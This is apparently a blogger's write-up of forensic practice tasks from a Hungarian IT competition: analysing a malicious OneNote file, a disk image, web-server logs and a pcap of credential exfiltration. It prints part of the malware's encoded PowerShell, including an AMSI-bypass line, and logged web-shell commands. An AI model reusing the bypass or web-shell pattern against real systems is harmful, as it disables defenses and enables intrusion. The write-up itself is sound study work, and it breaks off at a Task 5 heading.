OITM is the Hungarian acronym for National IT Challenge.

I'm interested in several categories such as:
 - Cyber Security
 - IT Security
 - Networking

Firstly I'll cover some of the tasks from the '23 batch as a practice. 

## Task 1 in the IT Security category: 
Password protected zip file, with .one file. Malware in hidden in the file. 
The tasks are: 
Find out the malicious script language
What tool was used for creating the malware
What is the C2 IP address


the first few commands to get started were:
   ```
   35  unzip ./malware.zip
   36  ls
   37  file Secret\ file.one
   38  strings Secret\ file.one | more
```

 as usual, the output is mostly gibberish, however some interesting lines can be found:
 ```1'%Fy
*\uz
PiM|
Secret file
Tuesday, August 29, 2023
4:14 PM
ma9@
Secret file
Tuesday, August 29, 2023
4:14 PM
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBq
AG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQA
ZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBl
AHQARgBpAGUAbABkACgAJwBhAG0AcwB
```

took this encoded part, I guess Base64 for encoding, which turned out to be correct:

```
└─$ base64 -d ./decode.txt  
If($PSVersionTable.PSVersion.Major -ge 3){$Ref=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$Ref.GetField('amsiInitFailed','NonPublic,Static').Setvalue($Null,$true);

[redacted]                                                                                                                
```

I had to remove the rest of the file output as it was flagged by Windows Defender. 
However, this also revealed the malware name, type, etc:
https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Trojan:PowerShell/Fleisnam.A&ThreatID=2147742186

And since it seems to be a legit malware without being defanged, I ran the sha256sum of the .one file on virustotal, to find out more about the malware. 


Also parsed the output into GPT, revealing the answers, as the IP, etc were hardcoded into the encoded script section. 

Combining the knowledge from VT, the decoded script and some researching revealed all the task objectives. 

## Task 2 in the IT Security category: 

IT forensics task with a .img file. 
The objectives of the task are:
Find out the formatting of the image file
What tools can be used to investigate the file
Reveal deleted or fragmented files on the disk
Is it trivial to crack the password protecting the recovered files. 

Let's begin,

```
└─$ file disk.img 
disk.img: DOS/MBR boot sector, code offset 0x58+2, OEM-ID "MSDOS5.0", sectors/cluster 8, reserved sectors 4110, Media descriptor 0xf8, sectors/track 63, heads 128, hidden sectors 1, sectors 2097152 (volumes > 32 MB), FAT (32 bit), sectors/FAT 2041, serial number 0x52d21f13, unlabeled
```
```
└─$ binwalk disk.img        

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
4221052       0x40687C        PNG image, 32 x 32, 8-bit/color RGBA, non-interlaced
4237980       0x40AA9C        PNG image, 2390 x 381, 8-bit/color RGBA, non-interlaced
4313103       0x41D00F        OpenSSH RSA1 private key, version "zaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBtV5FUEi"
4316477       0x41DD3D        Ubiquiti firmware header, third party, ~CRC32: 0x0, version: "SSH PRIVATE KEY-----"
```
now this already reveals some answers, however, photorec was a possible answer for the question regarding tools, so I decided to install it and investigate the file using it. 
The tool is extremely intuitive, within minutes I managed to locate a deleted file and copy it to my working folder. The file deleted was an RSA OpenSSH private key. 

This concluded the second task as all objectives were completed using the file recovery tool. 

### Task 3 in the IT Security category: 

In this task we are investigating webserver logs. 
The objectives are to find out the answer to these questions:
What was the malicious file uploaded to the ftp server.
What was the first remote command the attacker used.
What was the reverse shell port?

The two files we can work with:

```
└─$ unzip logs.zip                         
Archive:  logs.zip
             inflating: access.log              
             inflating: vsftpd.log  
```

We can see several uploads via the vsftpd.log file, however, if we cross-reference it with the access log, some interesting patterns approach. The shell.php file has been used maliciously a few times. 

to answer the second question, I looked for interactions from the known malicious IP:

```

$ cat access.log | grep "10.10.60.1" -C 1 -n -w
3406-10.10.50.63 - - [30/Aug/2023:09:51:43 +0200] "GET /quote HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62"
3407:10.10.60.1 - - [30/Aug/2023:10:00:43 +0200] "GET /shell.php HTTP/1.1" 200 203 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62"
3408:10.10.60.1 - - [30/Aug/2023:10:00:43 +0200] "GET /favicon.ico HTTP/1.1" 404 488 "http://10.10.60.2/shell.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62"
3409-10.10.60.15 - - [30/Aug/2023:10:01:00 +0200] "GET / HTTP/1.1" 200 3324 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
--
6156-10.10.50.7 - - [30/Aug/2023:10:01:01 +0200] "GET /astrology HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
6157:10.10.60.1 - - [30/Aug/2023:10:01:05 +0200] "GET /shell.php?cmd=id HTTP/1.1" 200 203 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62"
6158-10.10.50.7 - - [30/Aug/2023:10:11:34 +0200] "GET / HTTP/1.1" 200 3324 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"

```

this simple search answers all of our questions. 

### Task 4 in the IT Security category: 

Our task is to analyse a .pcap file. 

First challenge: find out what cloud provider was used by the attackers.

I tried to be clever here by using `tshark` and `grep` but looking for Azure, GCP and AWS resulted in several hits, without providing any insight if the frames were malicious. 
```
└─$ tshark -r traffic.pcap -Y "frame contains \"aws\" or frame contains \"azure\" or frame contains \"gcp\"" | grep -E "aws|azure|gcp"  
```

after manually scrolling through the traffic I found some retransmissions, but nothing to follow-up on. Then, a familiar number: 10.10.60.1 in frame 3302
```
3302	15.097828	10.10.60.1	34.159.33.139	HTTP	209	GET /get_xor_key HTTP/1.1 
```

HTTP traffic is always interesting, especially when:
```
[Full request URI: http://34.159.33.139/get_xor_key]
```


The second information needed for the challenge was about the encryption used in this scenario.
I wasn't aware of xor key encryption, but since the question is multiple choice with xor being one of the options, it must be the solution. 

The next task is connected to the previous, looking for the encryption key. 
I simply follow the http stream to extract this information:
```
GET /get_xor_key HTTP/1.1

Host: 34.159.33.139

User-Agent: python-requests/2.31.0

Accept-Encoding: gzip, deflate

Accept: */*

Connection: keep-alive

  

HTTP/1.1 200 OK

Server: Werkzeug/2.3.7 Python/3.10.12

Date: Thu, 31 Aug 2023 13:45:07 GMT

Content-Type: text/html; charset=utf-8

Content-Length: 32

Connection: close

  

6673526b57635[redacted]
```

Out of curiosity I pasted the string into CyberChef which translated it to fsRkWcP[redacted] from hex. 

Following this train of thought I looked for communication from the malicious remote IP. 
the /store_date URI was quite telling, especially knowing my next ask which was to find out what passwords were found and extracted. 

The interesting frame here is:

```
HTML Form URL Encoded: application/x-www-form-urlencoded
    Form item: "filename" = "credentials.txt"
    Form item: "content" = "302b1c07340e6511113d1a65310b1d03021f6b030d246109110d7f182d0415000540361d340e014f3a22[redacted]"
        Key: content
        Value: 302b1c07340e6511113d1a65310b1d03021f6b030d246109110d[redacted]

```

I took the value, and built a CyberChef recipe with the following elements:
- Input the value from the above frame. 
- Use From Hex to decode the string
- Use XOR operation to decrypt, using the key. `#at this step I had a few issues, tried to use the converted key, but didn't realize the correct Sceheme was simply Latin1. Used the original HEX key instead, which worked.`
- And finally convert the Base64 output, revealing:
```
Username: srv_admin
Password: [redacted]
```

### Task 5 in the IT Security category: 